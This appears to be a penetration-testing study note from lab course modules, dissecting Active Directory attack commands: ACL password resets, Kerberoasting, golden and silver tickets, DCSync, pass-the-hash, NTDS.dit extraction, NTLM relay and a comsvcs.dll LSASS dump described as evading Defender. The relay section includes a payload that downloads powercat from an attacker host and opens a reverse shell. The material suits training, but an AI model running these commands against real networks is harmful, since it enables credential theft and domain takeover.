# Active Directory (Breakdowns)

Teardowns for non-obvious AD commands. Phase-ordered coverage in [[Active Directory Methodology]], syntax in [[Active Directory]], decision logic in [[Active Directory (Decision Tree)]]. The core module arc starts at [[22. Active Directory Introduction and Enumeration]]; see also [[23. Attacking Active Directory Authentication]] and [[24. Lateral Movement in Active Directory]].

---

## ACL Abuse: PSCredential chain for multi-hop privilege escalation

**Full command set:**
```powershell
$passwd = ConvertTo-SecureString "transporter@4" -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $passwd)
$newPass = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
Set-DomainUserPassword -Identity damundsen -AccountPassword $newPass -Credential $Cred -Verbose
```

**Piece by piece:**
- `ConvertTo-SecureString "transporter@4" -AsPlainText -Force` → PowerShell requires passwords in `SecureString` format (encrypted in memory). `-AsPlainText` lets you start from a visible string; `-Force` acknowledges the security risk of having plaintext in the command.
- `New-Object System.Management.Automation.PSCredential('DOMAIN\user', $passwd)` → creates a credential object combining a domain-qualified username with the secure string. PowerView functions accept `-Credential $Cred` to operate in a different user's security context WITHOUT needing an interactive logon. This is how you chain compromised account A → attack account B without starting a new session.
- `Set-DomainUserPassword -Identity damundsen` → PowerView function that calls `net ads password` / ADSI under the hood to reset the named account's password. Requires `User-Force-Change-Password` or `GenericAll` ACE on the target account for the credential used in `-Credential`.
- `-Verbose` → shows the LDAP call being made, useful for confirming the correct DC was contacted.

**Where this comes from:** PowerView source; ACL abuse chain from [[22. Active Directory Introduction and Enumeration|AD.10]]; [[github.com/HackTricks-wiki/hacktricks/blob/master/windows-hardening/active-directory-methodology/acl-persistence-abuse.md|HackTricks ACL persistence]]

**Where to look in the response:** the Verbose output shows `Set-DomainUserPassword ... LDAP://...` followed by `[VERBOSE] Setting password for user damundsen...`. No news is good news: PowerView is silent on success unless you use `-Verbose`. If it throws an error, the ACE is missing or the password doesn't meet complexity requirements.

🔁 **Seen in:** [[22. Active Directory Introduction and Enumeration|AD.10 wley→damundsen→Help Desk Level 1→adunn chain]]

---

## ACL Abuse: Set-DomainObject to register a fake SPN (targeted Kerberoast)

**Full command:**
```powershell
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```

**Piece by piece:**
- `Set-DomainObject` → PowerView's generic attribute-setter against an AD object. Can write any non-protected attribute.
- `-Credential $Cred2` → runs the LDAP write as the account stored in `$Cred2`, which has `GenericWrite` on `adunn` (via Help Desk Level 1 group membership).
- `-Identity adunn` → the target account to modify.
- `-SET @{serviceprincipalname='notahacker/LEGIT'}` → PowerShell hashtable syntax for the attribute-value pair. `serviceprincipalname` is the LDAP attribute name; `notahacker/LEGIT` is a fake SPN value (class/hostname format). Any valid SPN string works, the content is irrelevant, just the existence of an SPN makes adunn Kerberoastable.
- The SPN causes the KDC to issue a TGS ticket for adunn encrypted with adunn's NTLM hash. Rubeus requests that ticket and you crack it offline.
- **Cleanup required:** `Set-DomainObject ... -Clear serviceprincipalname` to remove the fake SPN after cracking.

**Where this comes from:** [[22. Active Directory Introduction and Enumeration|AD.10]], [[github.com/HackTricks-wiki/hacktricks/blob/master/windows-hardening/active-directory-methodology/acl-persistence-abuse.md|HackTricks ACL. GenericWrite]]

**Where to look in the response:** `klist` after Rubeus should show a new TGS ticket for the target account. If you get "KRB_AP_ERR_MODIFIED" in Rubeus, the SPN format is wrong or conflicting with a real SPN, try a different class/hostname string.

🔁 **Seen in:** [[22. Active Directory Introduction and Enumeration|AD.10 step 3: Set SPN → targeted Kerberoast]]

---

## ExtraSids Golden Ticket: Rubeus golden with /sids flag

**Full command:**
```cmd
.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f ^
  /domain:LOGISTICS.INLANEFREIGHT.LOCAL ^
  /sid:S-1-5-21-2806153819-209893948-922872689 ^
  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 ^
  /user:hacker /ptt
```

**Piece by piece:**
- `golden` → Rubeus subcommand for forging a golden ticket (a Kerberos TGT signed with the KRBTGT hash, bypassing normal authentication).
- `/rc4:<hash>` → the KRBTGT account's NTLM hash from the child domain. This is what makes the ticket cryptographically valid: the KDC accepts any ticket signed with this key as legitimate.
- `/domain:CHILD.PARENT.LOCAL` → the child domain's FQDN. The ticket claims to be from this realm.
- `/sid:S-1-5-21-CHILD...` → the child domain's SID. Included in the PAC so the KDC can resolve the user's domain membership.
- `/sids:S-1-5-21-PARENT...-519` → the **ExtraSids** field. This is an additional SID array injected into the ticket's PAC. `519` is the Enterprise Admins RID. WITHIN_FOREST trusts don't strip extra SIDs (SID filtering only applies to cross-forest trusts), so the parent DC honours this injected group membership and treats the ticket holder as an Enterprise Admin.
- `/user:hacker` → the username claimed in the ticket. Arbitrary; doesn't need to exist in AD. The PAC's group memberships (including the injected EA SID) determine access, not the username.
- `/ptt` → Pass The Ticket: load the forged ticket directly into the current session's Kerberos cache. Equivalent to `kerberos::ptt` in mimikatz.

**Where this comes from:** [[22. Active Directory Introduction and Enumeration|AD.16]]; [[github.com/HackTricks-wiki/hacktricks/blob/master/windows-hardening/active-directory-methodology/sid-history-injection.md|HackTricks SID History Injection]]

**Where to look in the response:** `klist` immediately after should show the injected ticket. Then `ls \\parentdc.parent.local\c$` confirms access, a successful directory listing means the parent DC accepted the ticket and treated you as Enterprise Admin.

🔁 **Seen in:** [[22. Active Directory Introduction and Enumeration|AD.16 ExtraSids → parent DC access → f@ll1ng_l1k3_d0m1no3$]]

---

## dsquery LDAP filter: disabled admins with descriptions

**Full command:**
```cmd
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2)(adminCount>=1)(description=*))" -attr samAccountName description -limit 50
```

**Piece by piece:**
- `dsquery *` → query any object type (not just users, computers, or groups). The wildcard `*` enables custom LDAP filters via `-filter`.
- `-filter "(...)"` → raw LDAP filter syntax. `&(...)` is AND. Each `(attr=value)` is one condition.
- `objectCategory=person` + `objectClass=user` → together these specifically match domain user accounts (not contacts, not computers, not groups).
- `userAccountControl:1.2.840.113556.1.4.803:=2` → the OID `1.2.840.113556.1.4.803` is the LDAP bitwise-AND matching rule. `:=2` means "the UAC attribute with bit 2 set". Bit 2 in the UserAccountControl bitmap is `ACCOUNTDISABLE`. So this clause matches disabled accounts only.
- `adminCount>=1` → filters to accounts that have had `adminCount` set to 1 by the SD Propagator, meaning they were (or are) in a privileged group (Domain Admins, Account Operators, etc). This avoids noise from regular disabled users.
- `description=*` → account has any description value. Sysadmins sometimes leave the old password in this field as a reminder.
- `-attr samAccountName description` → only print these two attributes (no noise).
- `-limit 50` → stop after 50 results.

**Where this comes from:** [[22. Active Directory Introduction and Enumeration|AD.8.3]]; LDAP filter syntax from RFC 4515

**Where to look in the response:** any account where the description field contains something like "Password123!" or "last changed 2019-03". Disabled admin accounts with memorable descriptions are common in enterprise environments that don't have a formal offboarding process.

🔁 **Seen in:** [[22. Active Directory Introduction and Enumeration|AD.8]] Living Off the Land section, adunn appeared with description → Q answer HTB{LD@P_I$_W1ld}

---

---

## LDAPSearch function: DirectoryEntry + DirectorySearcher + samAccountType filter

**Full command set:**
```powershell
function LDAPSearch {
    param ([string]$LDAPQuery)
    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
    $DN  = ([adsi]'').distinguishedName
    $DE  = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DN")
    $DS  = New-Object System.DirectoryServices.DirectorySearcher($DE, $LDAPQuery)
    return $DS.FindAll()
}

LDAPSearch -LDAPQuery "(samAccountType=805306368)"
```

**Piece by piece:**
- `[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name` → Uses the .NET `ActiveDirectory.Domain` class (not LDAP directly) to get the domain object for the current machine's domain. `.PdcRoleOwner.Name` returns the FQDN of the DC holding the PDC FSMO role (most up-to-date, best for enumeration). This is the `Hostname` piece of the LDAP path.
- `([adsi]'').distinguishedName` → `[adsi]` is the ADSI (Active Directory Services Interface) COM interop accelerator. The empty string `''` tells ADSI to bind to the root of the current domain (the `RootDSE` entry). `.distinguishedName` returns `DC=corp,DC=com`, this is the `DistinguishedName` piece of the LDAP path. Together with PDC: `LDAP://DC1.corp.com/DC=corp,DC=com`.
- `New-Object System.DirectoryServices.DirectoryEntry("LDAP://...")` → Creates an object representing an LDAP node, the starting point for the search. Think of it as "opening a connection" to that point in the AD tree. The LDAP path as the constructor argument sets where the search starts.
- `New-Object System.DirectoryServices.DirectorySearcher($DE, $LDAPQuery)` → Creates the search engine. `$DE` is the base (where to start searching), `$LDAPQuery` is the filter (what to match). The searcher applies the filter against all objects at or below `$DE` in the tree.
- `FindAll()` → Executes the search and returns a `SearchResultCollection`, every object that matched the filter, each with a `.Path` (LDAP path of the object) and `.Properties` (all attributes as a hashtable).
- `(samAccountType=805306368)` → LDAP filter syntax. `samAccountType` is an attribute on every security principal (user, group, computer). The hex value `0x30000000` = decimal `805306368` = the `SAM_NORMAL_USER_ACCOUNT` constant, matches only domain user accounts. Using this instead of `(objectClass=user)` is faster and avoids computer accounts (computers are also `objectClass=user` in AD).
- Why not just `Get-ADUser`? → `Get-ADUser` requires RSAT (Active Directory PowerShell module) which is only installed on DCs and machines where an admin has specifically added it. `DirectorySearcher` uses the built-in .NET classes available on any Windows machine, no additional tools needed.

**Where this comes from:** .NET `System.DirectoryServices` namespace (built into .NET Framework); LDAP filter syntax from RFC 4515; samAccountType constants from Microsoft's MSDN SAM_ACCOUNT_TYPE docs.

**Where to look in the response:** Each result has `.Properties`, access attributes like `$result.properties.memberof`, `$result.properties.description`, `$result.properties.physicaldeliveryofficename`. For nested group chains: `$result.properties.member` shows member DNs including any nested group DNs (look for `CN=GroupName,` at the start, those are groups, not users). Run another LDAPSearch query on the nested group's CN to go one level deeper.

🔁 **Seen in:** [[22. Active Directory Introduction and Enumeration#22.2.3 Adding Search Functionality to our Script|Module 22 §22.2.3]]. LDAPSearch used to find nested group chain Service Personnel → Billing → Customer support → michelle; michelle's description attribute contained the flag.

---

---

## kerberos::golden — Silver Ticket forge (why "golden" command for silver tickets?)

**Full command (silver ticket example):**
```cmd
mimikatz # kerberos::golden /ptt /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com ^
  /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
```

**Naming confusion first:** Mimikatz uses `kerberos::golden` for BOTH golden tickets (full TGT forgery using KRBTGT hash) and silver tickets (TGS forgery using a service account hash). The distinction is the flags: golden tickets omit `/target` and `/service`; silver tickets include them. The command name just refers to the ticket-forging capability in general.

**Piece by piece:**
- `/ptt` — "Pass The Ticket". Injects the forged ticket directly into the current Kerberos session's in-memory cache. Without this you'd get a `.kirbi` file and have to run `kerberos::ptt ticket.kirbi` separately. With `/ptt` it's a one-step forge-and-inject.
- `/sid:S-1-5-21-...-XXXXXXX` — the domain SID, **without** the trailing RID. The KDC uses this to identify the ticket's domain of origin. Get it from `whoami /user` and strip the last number (the account's RID, e.g. `-1105`).
- `/domain:corp.com` — the domain FQDN. Must match the domain the target server is in.
- `/target:web04.corp.com` — the FQDN of the application server whose service you're forging a ticket for. This is what makes it a silver ticket: the ticket is scoped to ONE specific server, not the whole domain.
- `/service:http` — the Kerberos service class. This must match the SPN class registered for the target account (e.g. `http`, `cifs`, `host`, `ldap`, `mssql`, `wsman`). The application server checks that the ticket's service class matches what it expects.
- `/rc4:<hash>` — the NTLM hash of the SERVICE ACCOUNT (not krbtgt). Silver tickets are encrypted with the service account's hash because the app server decrypts them, not the KDC. This is the key asymmetry: the KDC is not involved at all after the ticket is forged.
- `/user:jeffadmin` — the username to claim inside the forged ticket. This controls what the application server thinks you are (and what group memberships your ticket claims). Any name works — it doesn't need to exist in AD.

**Why PAC validation doesn't stop this:** the PAC (Privilege Attribute Certificate) inside the ticket claims whatever group memberships we put in. Most application servers skip the optional step of asking the KDC to verify the PAC, they just trust the ticket contents. This is the fundamental design choice that makes silver tickets work.

**What it can and can't do:**
- CAN: access the specific service (http/cifs/etc.) on the target server as any user
- CANNOT: move laterally beyond that one server/service (scope is locked to /target and /service)
- CANNOT: be used to authenticate to the DC or KDC itself

**Where to look in the response:** Mimikatz prints `Silver ticket for 'jeffadmin @ corp.com' successfully submitted for current session`. Then `klist` shows the injected ticket under Group 0 as a TGS for the target SPN. Then `iwr -UseDefaultCredentials http://web04` (or equivalent) to actually use it.

🔁 **Seen in:** [[23. Attacking Active Directory Authentication#23.2.4 Silver Tickets|Module 23 §23.2.4]], forged http/web04.corp.com as jeffadmin → flag OS{c1f252d8a7b98d70a86df3bb65559f94}

---

## lsadump::dcsync — How DRSUAPI impersonation works

**Full command:**
```cmd
mimikatz # lsadump::dcsync /user:corp\krbtgt
mimikatz # lsadump::dcsync /user:corp\Administrator
```

**What actually happens under the hood:**
Mimikatz opens an RPC connection to the DC and calls `IDL_DRSGetNCChanges`, part of the Microsoft DRS (Directory Replication Service) Remote Protocol (MS-DRSR). This is the same API that real domain controllers use to replicate AD objects between themselves. The DC checks whether the requesting SID has `DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All` privileges on the domain NC, it does NOT verify that the caller is an actual DC.

**Piece by piece:**
- `lsadump::dcsync` — the Mimikatz module for DRS-based credential extraction. No need to be on the DC; no need to touch LSASS. The credentials are pulled via legitimate-looking DC replication traffic.
- `/user:corp\krbtgt` — the target account to replicate. The DC returns the full attribute set for that account including the current + history NTLM hash, AES-256 key, AES-128 key, LM hash (if available), Kerberos keys, and password history. Without this flag: dumps all accounts (very noisy, very large).
- `/domain:DOMAIN.LOCAL` — required when not running from a domain-joined machine or when targeting a different domain. Omit when already in the target domain context.

**Why krbtgt first:** the krbtgt NTLM hash enables golden ticket forgery, a forged TGT that the KDC will validate as legitimate (since it's signed with the real key). Golden tickets survive account password changes (until krbtgt is rotated twice) and give persistent DA access. Pull krbtgt before anything else.

**Required rights:** default holders are Domain Admins, Enterprise Admins, and the Administrators group. Individual accounts can also be granted `DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All` on the domain NC, this is a common misconfiguration in environments that set up Azure AD Connect manually.

**What the output gives you:**
- `Hash NTLM: <32-hex-chars>` — crack with hashcat -m 1000, or use directly in PtH/sekurlsa::pth
- `aes256_hmac (4096)` — use with /aes256 in Kerberos tool flags (AES is quieter than RC4 in SIEM logs)
- `Password history` — old passwords, useful if the user might have reused them elsewhere

🔁 **Seen in:** [[23. Attacking Active Directory Authentication#23.2.5 Domain Controller Synchronization (DCSync)|Module 23 §23.2.5]], dumped krbtgt NTLM: 1693c6cefafffc7af11ef34d1c788f47

---

## sekurlsa::pth — Pass-the-Hash without cracking

**Full command:**
```cmd
mimikatz # sekurlsa::pth /user:maria /domain:corp.com /ntlm:2a944a58d4ffa77137b2c587e6ed7626 /run:powershell
```

**Piece by piece:**
- `sekurlsa::pth` — "Pass the Hash" via the security support provider layer. Creates a new process with a spoofed authentication token using the hash instead of the plaintext password. The NTLM hash IS the password for network authentication — Windows never needs to reverse it.
- `/user:maria` — the account to impersonate. Must be a valid account name (used to construct the authentication token).
- `/domain:corp.com` — the domain FQDN for the account. Use the NetBIOS domain name (CORP) for local accounts.
- `/ntlm:<hash>` — the NTLM hash from LSASS (via sekurlsa::logonpasswords or DCSync output). This is the NT hash portion — hashcat -m 1000 cracks it, or you skip cracking and use it directly here.
- `/run:powershell` — the command to run in the new process (defaults to `cmd.exe` if omitted). The new process runs under a new logon session with maria's token. Local operations in that window still run as the user who launched Mimikatz — only NETWORK authentication (UNC paths, WinRM, SMB) uses maria's credentials.

**The critical detail:** the new PowerShell window can do `type \\dc1\c$\...` or `net use` against remote resources because those go through NTLM (hashed credentials over the wire). But local commands like `whoami` will still show the original user, the token only activates for outbound network auth.

**When to use vs impacket PtH:**
- `sekurlsa::pth` → spawns an interactive shell on the CURRENT Windows machine → ideal for GUI/interactive exploration
- `impacket-psexec -hashes` → remote shell on the TARGET machine → ideal from Kali

🔁 **Seen in:** [[23. Attacking Active Directory Authentication#23.2.5 Domain Controller Synchronization (DCSync)|Module 23 §23.2.5 Capstone VM Group 2]]. PtH as maria → accessed \\192.168.249.70\c$\ → flag.txt

---

---

## New-CimSession + Invoke-CimMethod — WMI lateral movement over DCOM

**Full command set:**
```powershell
$options = New-CimSessionOption -Protocol DCOM
$session = New-CimSession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $options
Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $command}
```

**Piece by piece:**
- `New-CimSessionOption -Protocol DCOM` → CIM (Common Information Model) sessions support two transport protocols: WSMAN (WinRM, port 5985/5986) and DCOM (Distributed COM, port 135 + negotiated high port). DCOM is used here because it works without WinRM being configured on the target. The option object just stores the protocol choice.
- `New-CimSession -ComputerName ... -Credential ... -SessionOption $options` → opens a persistent CIM connection to the remote machine. Under the hood this is an RPC call to the DCOM Service Control Manager (DCOMSCM) on port 135, which negotiates a dynamic port for the actual data channel. The `-Credential` object carries the plaintext-equivalent authentication material for the NTLM/Kerberos negotiation.
- `Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create` → calls `Win32_Process.Create()` remotely. This is the WMI method that spawns new processes. It's the same underlying mechanism as the deprecated `wmic process call create` command.
- `-Arguments @{CommandLine = $command}` → PowerShell hashtable supplying the method's input parameters. `CommandLine` is the WMI Win32_Process.Create() parameter name for what to run.
- **Session 0 caveat:** `Win32_Process.Create()` always spawns in Session 0 (the non-interactive service session). The process is invisible on the target's desktop. `ReturnValue = 0` confirms success; the `ProcessId` in the output is its PID, verifiable with `tasklist` on the target.

**Where this comes from:** [[https://learn.microsoft.com/en-us/windows/win32/cimwin32prov/create-method-in-class-win32-process|MSDN Win32_Process.Create()]] | [[24. Lateral Movement in Active Directory#24.1.1 WMI and WinRM|Module 24 §24.1.1]]

**Where to look in the response:** `ReturnValue = 0` and a `ProcessId` value. Any non-zero ReturnValue is a failure: 2 = access denied, 8 = unknown failure, 9 = path not found, 21 = invalid parameter.

🔁 **Seen in:** [[24. Lateral Movement in Active Directory#24.1.1 WMI and WinRM|Module 24 §24.1.1 Lab VM Group 2]], spawned reverse shell on web04 as corp\jen

---

## vshadow.exe + copy — Shadow Copy extraction of locked NTDS.dit

**Full command chain:**
```cmd
C:\Tools\vshadow.exe -nw -p C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
reg.exe save hklm\system c:\system.bak
```
```bash
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```

**Piece by piece:**
- `vshadow.exe` → Volume Shadow Service administrative command-line tool from the Windows SDK. Creates and manages VSS shadow copies. Not present on Windows by default; needs to be transferred to the DC.
- `-nw` → "no-writers". Skips the VSS writer coordination phase (applications like SQL Server and Exchange register VSS writers to quiesce their files before snapshot). Skipping writers is faster and avoids writer timeouts, acceptable for NTDS because the AD database engine (ESENT) has its own transaction log and the snapshot is still consistent at the VSS level.
- `-p` → "persistent". Shadow copy survives after vshadow.exe exits. Without this it would be auto-deleted as a "non-persistent" snapshot when the process ends.
- `C:` → the volume to snapshot. Must be the volume hosting the Windows directory (where NTDS.dit lives).
- `\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\...` → the shadow copy device path. This is a Win32 device namespace path (the `\\?\` prefix bypasses the Win32 path length limit and namespace parsing). `GLOBALROOT` is a special symlink in the object manager that exposes kernel device objects directly. `HarddiskVolumeShadowCopyN` is the shadow copy volume device. This path provides a frozen read-only view of C: at the snapshot moment, the live ntds.dit's file lock does not extend to this device path.
- `reg.exe save hklm\system c:\system.bak` → exports the SYSTEM registry hive. The SYSTEM hive contains the Boot Key (also called SYSKEY), which is used to encrypt the Password Encryption Key (PEK) stored in ntds.dit. Without the SYSTEM hive, secretsdump cannot derive the PEK and cannot decrypt any hashes.
- `impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL` → `LOCAL` tells secretsdump to work on local files rather than connecting to a live DC. It: (1) extracts the Boot Key from system.bak, (2) decrypts the PEK from ntds.dit.bak using the Boot Key, (3) decrypts each account's stored credentials using the PEK. Output format: `username:RID:LM_hash:NT_hash:::`.

**Where this comes from:** [HackTricks NTDS extraction](https://github.com/HackTricks-wiki/hacktricks/blob/master/windows-hardening/active-directory-methodology/ntds.md) | [[24. Lateral Movement in Active Directory#24.2.2 Shadow Copies (VSS)|Module 24 §24.2.2]]

**Where to look in the response:** `vshadow.exe` output prints `Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2`, **this exact string** goes into the copy command. The number at the end (2) increments if previous shadow copies exist on the volume. Always use the device name from the current vshadow run, not a hardcoded one.

🔁 **Seen in:** [[24. Lateral Movement in Active Directory#24.2.2 Shadow Copies (VSS)|Module 24 §24.2.2]], extracted NTDS.dit from DC1 to recover all domain hashes offline

---

---

## impacket-ntlmrelayx — full NTLM relay chain with -c command execution

**Full command:**
```bash
sudo impacket-ntlmrelayx \
  --no-http-server \
  -smb2support \
  -t 192.168.50.242 \
  -c "powershell -enc SQBFAFgA..."
```

**Piece by piece:**
- `sudo` → port 445 requires root. ntlmrelayx opens an SMB server on 445 to catch inbound authentication. Without sudo, the bind fails silently.
- `--no-http-server` → disables the HTTP capture listener. ntlmrelayx can listen on both HTTP and SMB simultaneously; disabling HTTP avoids port conflicts when another service (nginx, wsgidav, python http.server) is already bound to 80.
- `-smb2support` → enables SMB2/3 relay. SMB1 is disabled on all modern Windows (post-2017 security patches). Without this flag, ntlmrelayx only speaks SMB1 and the inbound connection is rejected before the relay attempt.
- `-t 192.168.50.242` → the relay target. ntlmrelayx forwards the captured NTLM tokens to this address as if it were the original client. The target must have SMB signing **disabled** — check with `crackmapexec smb <targets> --gen-relay-list relayable.txt` or look for `signing:False` in CME output.
- `-c "powershell -enc ..."` → command to execute on the relay target in the context of the relayed account. Runs via the Windows Service Control Manager (SCM), so the command needs to be short (SCM has a command-length limit). Base64+`-enc` avoids quoting problems with special characters.

**Why base64 encoding for `-c`?** ntlmrelayx passes the `-c` string through Win32 SCM's `CreateService` → `StartService` API. Special characters (`'`, `(`, `)`, `;`, `/`) in the raw PowerShell payload break the SCM argument parser. Encoding as UTF-16LE base64 and running via `powershell -enc` bypasses all quoting issues — the encoded string is a single quoted argument with no special chars.

**Generate the payload (must be UTF-16LE, not UTF-8):**
```powershell
$Text  = "IEX(New-Object System.Net.WebClient).DownloadString('http://<KALI>:8888/powercat.ps1');powercat -c <KALI> -p 9999 -e powershell"
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)   # Unicode = UTF-16LE in .NET
[Convert]::ToBase64String($Bytes)
```

**What triggers the relay?** Any application feature that initiates an outbound UNC/SMB connection to an attacker-controlled path. In the module context: WordPress Backup Migration plugin → backup directory set to `//KALI_IP/test`. Other triggers: printer settings pages, MSI install paths, network share browsing links.

**Where to look in the output:** `[*] Authenticating against smb://<target> as <DOMAIN>/<USER> SUCCEED` → relay worked. `[*] Executed specified command on host: <target>` → SCM ran the command. A few seconds later your nc listener catches the shell.

🔁 **Seen in:** [[27. Assembling the Pieces#27.5.2 NTLM Relay via WordPress Backup Migration Plugin|Assembling the Pieces#27.5.2 NTLM Relay via WordPress Backup Migration Plugin]]

---

## rundll32 comsvcs.dll MiniDump — Defender-safe LSASS dump

**Full command:**
```powershell
rundll32 C:\Windows\System32\comsvcs.dll MiniDump <LSASS_PID> C:\Windows\Temp\lsass.dmp full
```

**Piece by piece:**
- `rundll32` → loads and calls an exported function from a DLL without a dedicated EXE wrapper. The calling convention is `rundll32 <dllpath> <ExportName> [args...]`.
- `C:\Windows\System32\comsvcs.dll` → COM+ Services DLL, present and Microsoft-signed on all Windows versions. Defender does not quarantine calls to it — this is the whole point. Alternative dumping tools (ProcDump, Task Manager, mimilib) are often flagged; comsvcs.dll is not.
- `MiniDump` → the export name inside comsvcs.dll that wraps `MiniDumpWriteDump()` from `dbghelp.dll`. The function signature it exposes is `MiniDump(PID, file, flags)`.
- `<LSASS_PID>` → the numeric PID of `lsass.exe`. Get it with `Get-Process lsass` or `tasklist /FI "IMAGENAME eq lsass.exe"`. The PID changes each reboot.
- `C:\Windows\Temp\lsass.dmp` → the output file path. Must be writable. `C:\Windows\Temp` is writable by SYSTEM (which you need to be anyway). `C:\Temp` works too if it exists.
- `full` → maps to the `MiniDumpWithFullMemory` flag constant. Dumps the complete process address space, including the LSA cache pages that hold credential material. Without `full`, you get a minimal dump that pypykatz/mimikatz cannot extract creds from.

**Why it bypasses Defender:** comsvcs.dll is a legitimate Microsoft component used by COM+ itself. Its MiniDump export has existed since Windows XP. Defender's AMSI and real-time protection focus on known-bad PE files and in-memory shellcode patterns — they do not flag calls to system-shipped DLL exports, even when applied to LSASS.

**Requires SYSTEM:** MiniDumpWriteDump on LSASS requires `SeDebugPrivilege`, which is held by SYSTEM and Administrators (when UAC is elevated). A low-privilege user cannot dump LSASS even with this method.

**What "silent" means:** `rundll32` does not print any output on success. The command returns to the prompt. Verify the dump with `dir C:\Windows\Temp\lsass.dmp` — a complete dump is typically 45-50 MB. If the file is 0 bytes or missing, check the PID and that you are SYSTEM.

🔁 **Seen in:** [[27. Assembling the Pieces#27.6.1 Dumping Beccy's Credentials from MAILSRV1|Assembling the Pieces#27.6.1 Dumping Beccy's Credentials from MAILSRV1]]

---

## pypykatz lsa minidump — offline LSASS credential parsing

**Full command:**
```bash
pypykatz lsa minidump /tmp/share/lsass.dmp
```

**Piece by piece:**
- `pypykatz` → Python reimplementation of mimikatz's credential parsing logic. Runs entirely on Kali (or any Python host), no Windows required. Parses Windows LSASS dump files offline.
- `lsa` → selects the LSA (Local Security Authority) subsystem parser. Other available subcommands: `registry` (for SAM/SECURITY hive parsing), `live` (for live LSASS dumping on Windows, not relevant from Kali).
- `minidump` → specifies the input format as a Windows MiniDump (`.dmp`) file, as produced by comsvcs.dll, ProcDump, or Task Manager.
- `/tmp/share/lsass.dmp` → path to the dump file.

**Output structure:** one `== LogonSession ==` block per logon session. Each block contains:
- `username` / `domainname` — the account and domain
- `authentication_id` — LUID identifying the session
- `msv` subsection — NTLM hashes (NT and LM). The NT hash is what you use for PtH.
- `kerberos` subsection — cleartext password if WDigest is enabled or if the credential is still in the LSA cache.
- `tspkg`, `wdigest`, `credman` — other SSPs, may contain cleartext in older or misconfigured environments.

**Finding beccy in the output:** the dump contains sessions for every user who has logged in since the last reboot. Filter visually by `username` or pipe to `grep -A 20 "beccy"`. The NT hash is on the `NT:` line in the `msv` block.

🔁 **Seen in:** [[27. Assembling the Pieces#27.6.1 Dumping Beccy's Credentials from MAILSRV1|Assembling the Pieces#27.6.1 Dumping Beccy's Credentials from MAILSRV1]]

---

## Forest: Why RPC and LDAP can expose different users

RPC null-session enumeration and anonymous LDAP search query different Windows interfaces. Their permissions and filtering are not identical, so an account such as `$Username` can appear in `rpcclient enumdomusers` while being absent from an anonymous LDAP result. Run both before building a roasting candidate list.

## Forest: GetNPUsers can succeed without useful stdout

With `-request -outputfile`, GetNPUsers writes the AS-REP ticket to the chosen file. A roastable account may not produce a clear success line on screen. Verify the file exists and contains a ticket-shaped record before assuming the request failed.

## Forest: WriteDACL and DCSync

WriteDACL on the domain naming context lets a principal modify the domain object's access control list. Adding the two replication rights used by DCSync, `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All`, allows the principal to request password data from the domain controller without logging on locally.

## Forest: Why --local-auth is wrong on a domain controller

`--local-auth` tells a tool to check the target's local SAM database. A domain controller authenticates domain accounts through Active Directory and does not provide a normal separate local-account path for this purpose. Use `-d $Domain` for domain credentials.

## Forest: PowerShell command separators

PowerShell uses `;` to separate commands in a one-liner. `&&` is a Bash-style separator and is not reliable in the Windows PowerShell version commonly found on older domain controllers.

#### Tags: #CommandBreakdowns #ActiveDirectory #ACLAbuse #PSCredential #SetDomainObject #ExtraSids #Rubeus #dsquery #GoldenTicket #SilverTicket #DCSync #PtH #DRSProtocol #Mimikatz #HTBSupplementary #Module22 #Module23 #LDAPSearch #DirectorySearcher #ADSI #samAccountType #WMI #CIMSession #DCOM #ShadowCopy #vshadow #NTDS #secretsdump #LateralMovement #Module24 #NTLMRelay #ntlmrelayx #comsvcs #MiniDump #pypykatz #LSASS #LateralMovement #Module27 #AssemblingThePieces #AccountOperators #ExchangeWindowsPermissions #bloodyAD #ASREPRoasting
## External Resources

- [HackTricks - Pentesting Index](https://hacktricks.wiki/en/index.html)
- [PayloadsAllTheThings - Methodology and Resources](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources)
- [RevShells](https://www.revshells.com/) for payload troubleshooting
- [CyberChef](https://gchq.github.io/CyberChef/) for encoding and decoding
- [ippsec.rocks](https://ippsec.rocks/) for walkthrough searches
